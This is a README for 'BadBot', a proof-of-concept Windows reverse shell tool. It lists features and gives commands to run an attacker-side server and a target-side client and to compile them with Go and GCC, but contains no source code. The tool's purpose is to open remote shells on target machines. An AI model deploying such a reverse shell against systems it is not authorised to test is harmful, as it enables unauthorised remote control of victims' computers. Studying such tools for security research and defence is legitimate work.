# BadBot Windows Reverse Shell 🪟

## 📜 Overview

BadBot Windows Reverse Shell is a proof-of-concept tool designed to demonstrate reverse shell capabilities on Windows systems. Use this tool only in a legal and ethical manner. Misuse may result in severe legal consequences.

(https://gyazo.com/245fd3995dbe86e3a4d54c374fcb6b6b)

## ✨ Features

- 🌐 Establish a reverse shell connection from a Windows machine
- ⚙️ Supports basic command execution

## 💡 Requirements

- 🖥️ Windows operating system
- 🛠️ Golang / GCC must be installed if you want to compile
- 🌍 Network access to a remote server

## 🚀 Usage

1. **The Server (Attacker's Side)**

    ```bash
    attacker > $ ./BadBot-Server.exe [Port]
    ```

2. **Client (Target's Side)**

    ```bash
    target > $ ./BadBot-Client.exe [Port]
    ```

## 🔨 Compilation
1. **Server**
   
    ```bash
    $ go build -o BadBot-Server.exe
    ```
2. **Client**

    ```bash
    $ gcc main.c -lws2_32 -Wall -Wextra -Wpedantic -o BadBot-Client.exe

    ```
